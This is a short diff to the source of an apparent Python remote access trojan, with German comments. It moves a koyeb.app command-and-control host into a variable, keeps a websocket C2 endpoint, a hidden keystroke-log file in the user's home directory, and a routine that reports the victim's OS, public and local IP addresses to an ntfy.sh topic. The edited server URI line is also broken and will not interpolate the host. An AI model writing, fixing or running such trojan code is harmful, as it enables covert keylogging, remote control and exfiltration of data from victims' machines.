@@ -23,9 +23,10 @@ from cryptography.hazmat.backends import default_backend
 import tempfile
 import threading
 import time
+rat_url = "yawning-chameleon-norobb-e4dabbb0.koyeb.app"
 
 # --- Konfiguration & Globals ---
-SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
+SERVER_URI = "wss://{rat_url}}:443/rat"
 KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
 NTFY_TOPIC = "RAT_JundN"
 CHUNKED_UPLOADS = {}
@@ -114,7 +115,7 @@ def send_ntfy_notification():
             f"OS: {platform.platform()}\n"
             f"Öffentliche IP: {get_public_ip()}\n"
             f"Lokale IPs: {get_local_ips()}\n"
-            f"RAT-URL: https://yawning-chameleon-norobb-e4dabbb0.koyeb.app"
+            f"RAT-URL: {rat_url}"
         )
         req = urllib.request.Request(
             f"https://ntfy.sh/{NTFY_TOPIC}",
